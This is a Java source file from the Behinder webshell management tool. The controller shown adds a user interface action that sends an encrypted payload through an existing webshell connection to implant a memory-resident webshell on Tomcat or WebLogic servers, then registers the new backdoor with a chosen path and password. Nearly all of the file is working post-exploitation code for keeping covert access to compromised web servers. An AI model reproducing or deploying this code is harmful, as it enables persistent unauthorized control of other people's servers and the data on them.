package net.rebeyond.behinder.ui.controller;

import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.ComboBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import net.rebeyond.behinder.core.Crypt;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import net.rebeyond.behinder.utils.Utils;
import org.json.JSONObject;

import java.net.URL;
import java.util.*;

public class MemTroyViewController {
    @FXML
    private ComboBox typeComboBox;

    @FXML
    private TextField passwordTextField;

    @FXML
    private TextField pathTextField;

    @FXML
    private Button insertWebshellButton;

    @FXML
    private Label statusLabel;

    public MemTroyViewController() throws Exception {
    }

    public void init(ShellService shellService, final List<Thread> workList, ShellManager shellManager) {
        this.currentShellService = shellService;
        this.shellEntity = shellService.getShellEntity();
        this.workList = workList;
        this.shellManager = shellManager;
        this.statusLabel.setText("");

        //init MemTroy UI
        typeComboBox.getItems().addAll(
                "tomcat",
                "weblogic"
        );
        typeComboBox.setValue("tomcat");

        insertWebshellButton.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {

                        try {
                            String password = passwordTextField.getText();
                            String path = pathTextField.getText();
                            String type = typeComboBox.getValue().toString();
                            System.out.println(String.format("%s\t%s\t%s", password, path, type));

                            String memTroy = insertMemTroy("123", "MemTroy", path, Utils.getMD5(password));
                            if (memTroy.equals("{\"success\":\"dHJ1ZQ==\"}")) {
                                String host = new URL(currentShellService.currentUrl).getHost();
                                int port = new URL(currentShellService.currentUrl).getPort();
                                String protocol = new URL(currentShellService.currentUrl).getProtocol();
                                shellManager.addShell(new URL(protocol, host, port, path).toString(), password, "jsp", "Default", "", "");
                                notifyInstallStatus(true);
                            }else {
                                notifyInstallStatus(false);
                            }

                        } catch (Exception e) {
                            e.printStackTrace();
                            notifyInstallStatus(false);
                        }
                    }
                });
                workList.add(thread);
                thread.start();
            }
        });
    }

    private void notifyInstallStatus(boolean status) {
        Platform.runLater(new Runnable() {
            @Override
            public void run() {
                if (status) {
                    statusLabel.setText("插入内存马成功");
                } else {
                    statusLabel.setText("插入内存马失败");
                }
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        Platform.runLater(new Runnable() {
                            @Override
                            public void run() {
                                statusLabel.setText("");
                            }
                        });
                    }
                }, 5000);
            }
        });
    }

    public String insertMemTroy(String whatever, String className, String path, String password) throws Exception {
        String result = "";
        Map<String, String> params = new LinkedHashMap();
        params.put("whatever", whatever);
        params.put("path", path);
        params.put("password", password);
        byte[] data = Utils.getData(currentShellService.currentKey, currentShellService.encryptType, className, params, currentShellService.currentType);
        Map<String, Object> resultObj = Utils.requestAndParse(currentShellService.currentUrl, currentShellService.currentHeaders, data, currentShellService.beginIndex, currentShellService.endIndex);
        byte[] resData = (byte[]) resultObj.get("data");

        try {
            result = new String(Crypt.Decrypt(resData, currentShellService.currentKey, currentShellService.encryptType, currentShellService.currentType));
            return result;
        } catch (Exception var8) {
            var8.printStackTrace();
            throw new Exception("请求失败:" + new String(resData, "UTF-8"));
        }
    }

    private ShellService currentShellService;
    private ShellManager shellManager;
    private JSONObject shellEntity;
    private List workList;

}
